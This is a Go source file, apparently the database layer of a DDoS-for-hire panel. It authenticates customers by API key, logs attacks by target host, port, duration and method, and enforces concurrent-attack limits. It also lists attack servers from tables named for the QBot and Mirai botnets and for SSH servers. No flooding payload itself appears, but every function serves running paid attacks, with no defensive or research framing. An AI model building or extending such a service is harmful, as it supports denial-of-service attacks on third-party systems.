package database

import (
	"database/sql"
	"errors"
	"fmt"
	"log"
	"strconv"
	"webserver/src/config"

	_ "github.com/go-sql-driver/mysql"
)

var Sql *sql.DB

func ConnectDatabase() error {
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", config.Cfg.Mysql.User, config.Cfg.Mysql.Pass, config.Cfg.Mysql.Host, config.Cfg.Mysql.Name))
	if err != nil {
		return err
	}
	Sql = db
	log.Printf("\u001B[0m\u001B[107m\u001B[38;5;163m[database]\u001B[0m\u001B[38;5;046m Started! \u001B[38;5;230m")
	return nil
}

func CheckKeyUser(user string, key string) (*User, bool) {
	rows, err := Sql.Query("SELECT * FROM `users` WHERE `username` = ? AND `apikey` = ?", user, key)
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, false
		}
		log.Printf("(db/err) %s", err)
		return &User{}, false
	}
	defer rows.Close()

	for rows.Next() {
		usr := &User{}
		if err := ScanUser(rows, usr); err != nil {
			log.Printf("(db/err) %s", err)
			return usr, false
		} else {
			return usr, true
		}
	}
	return &User{}, false
}

func LogAttack(username string, host string, port string, atime string, method string) error {
	// convert port and time to int
	prt, err := strconv.Atoi(port)
	if err != nil {
		return err
	}
	tm, err := strconv.Atoi(atime)
	if err != nil {
		return err
	}
	// Insert into logs
	rows, err := Sql.Query("INSERT INTO `logs` (username, host, port, duration, method, time_sent) VALUES(?, ?, ?, ?, ?, UNIX_TIMESTAMP())", username, host, prt, tm, method)
	if err != nil {
		return err
	}
	if rows != nil {
		rows.Close()
	}
	return err
}

func FetchUsers() ([]*User, error) {
	var users []*User
	rows, err := Sql.Query("SELECT * FROM `users`")
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}
		return users, err
	}
	defer rows.Close()

	for rows.Next() {
		user := &User{}
		if err := ScanUser(rows, user); err != nil {
			log.Printf("(db/err) %s", err)
			continue
		}
		users = append(users, user)
	}
	return users, nil
}

func FetchQbots() ([]*Qbots, error) {
	var qbots []*Qbots
	rows, err := Sql.Query("SELECT * FROM `qbots`")
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}
		return qbots, err
	}
	defer rows.Close()

	for rows.Next() {
		qbot := &Qbots{}
		if err := ScanQbots(rows, qbot); err != nil {
			log.Printf("(db/err) %s", err)
			continue
		}
		qbots = append(qbots, qbot)
	}
	return qbots, nil
}
func FetchAPIS() ([]*APIS, error) {
	var apis []*APIS
	rows, err := Sql.Query("SELECT * FROM `apis` WHERE `active` = 1")
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}
		return apis, err
	}

	defer rows.Close()

	for rows.Next() {
		api := &APIS{}
		if err := ScanAPIS(rows, api); err != nil {
			log.Printf("(db/err) %s", err)
			continue
		}
		apis = append(apis, api)
	}
	return apis, nil
}

func GetRunning(username string) ([]*Attacks, error) {
	var attacks []*Attacks
	rows, err := Sql.Query("SELECT * FROM `logs` WHERE `username` = ? AND `duration` + `time_sent` > UNIX_TIMESTAMP()", username)
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}
		return attacks, err
	}
	defer rows.Close()

	for rows.Next() {
		attack := &Attacks{}
		if err := ScanAttacks(rows, attack); err != nil {
			log.Printf("(db/err) %s", err)
			continue
		}
		attacks = append(attacks, attack)
	}
	return attacks, nil
}

func GetAllRunning() ([]*Attacks, error) {
	var attacks []*Attacks
	rows, err := Sql.Query("SELECT * FROM `logs` WHERE `duration` + `time_sent` > UNIX_TIMESTAMP()")
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}
		return attacks, err
	}
	defer rows.Close()

	for rows.Next() {
		attack := &Attacks{}
		if err := ScanAttacks(rows, attack); err != nil {
			log.Printf("(db/err) %s", err)
			continue
		}
		attacks = append(attacks, attack)
	}
	return attacks, nil
}

func FetchMirais() ([]*Mirais, error) {
	var mirais []*Mirais
	rows, err := Sql.Query("SELECT * FROM `mirais`")
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}
		return mirais, err
	}
	defer rows.Close()
	for rows.Next() {
		mirai := &Mirais{}
		if err := ScanMirais(rows, mirai); err != nil {
			log.Printf("(db/err) %s", err)
			continue
		}
		mirais = append(mirais, mirai)
	}
	return mirais, nil
}

func FetchSSH() ([]*SSH_SERVERS, error) {
	var servers []*SSH_SERVERS
	rows, err := Sql.Query("SELECT * FROM `ssh_servers`")
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}
		return servers, err
	}

	defer rows.Close()

	for rows.Next() {
		server := &SSH_SERVERS{}
		if err := ScanSSH(rows, server); err != nil {
			log.Printf("(db/err) %s", err)
			continue
		}
		servers = append(servers, server)
	}
	return servers, nil
}

func GetConcurrents(username string) int {
	rows, err := Sql.Query("SELECT COUNT(*) FROM `logs` WHERE `username` = ? AND `duration` + `time_sent` > UNIX_TIMESTAMP()", username)
	if err != nil {
		if err == sql.ErrNoRows {
			return 0
		}
		log.Printf("(db/err) %s", err)
		return 0
	}
	defer rows.Close()
	var count int

	for rows.Next() {
		if err := rows.Scan(&count); err != nil {
			log.Printf("(db/err) %s", err)
			return 0
		}
	}
	return count
}

func GetMethods() ([]*Methods, error) {
	var methods []*Methods
	rows, err := Sql.Query("SELECT * FROM `methods`")
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, nil
		}
		return methods, err
	}
	defer rows.Close()

	for rows.Next() {
		method := &Methods{}
		if err := ScanMethods(rows, method); err != nil {
			log.Printf("(db/err) %s", err)
			continue
		}
		methods = append(methods, method)
	}
	return methods, nil
}

func ClearLogs(username string) error {
	rows, err := Sql.Query("DELETE FROM `logs` WHERE `username` = ? AND `duration` + `time_sent` < UNIX_TIMESTAMP()", username)
	if err != nil {
		log.Printf("(err/db) %s", err)
		return errors.New("Something Went Wrong...")
	}
	if rows == nil {
		return errors.New("no logs to delete!")
	}
	rows.Close()
	return err
}

func AddNewUser(username string, key string, concurrents int, maxtime int, rank int, expire int) error {
	rows, err := Sql.Query("INSERT INTO `users` (username, apikey, concurrents, max_time, `rank`, `expire`) VALUES(?, ?, ?, ?, ?, ?)", username, key, concurrents, maxtime, rank, expire)
	if err != nil {
		return err
	}
	if rows != nil {
		rows.Close()
	}
	return err
}

func RemoveUser(username string) (error, bool) {
	rows, err := Sql.Query("DELETE FROM `users` WHERE `username` = ?", username)
	if err != nil {
		if err == sql.ErrNoRows {
			return nil, false
		}
		return err, false
	}
	if rows != nil {
		rows.Close()
	}
	return nil, true
}

func CheckBan(username string) bool {
	rows, err := Sql.Query("SELECT * FROM `users` WHERE `username` = ? AND `rank` = 0", username)
	if err != nil {
		log.Printf("(chk/err) %s", err)
		return true
	}
	for rows.Next() {
		return true
	}
	return false
}

func ChangeRank(username string, rank int) error {
	rows, err := Sql.Query("UPDATE `users` SET `rank` = ? WHERE `username` = ?", rank, username)
	if err != nil {
		return err
	}
	if rows != nil {
		rows.Close()
	}
	return err
}
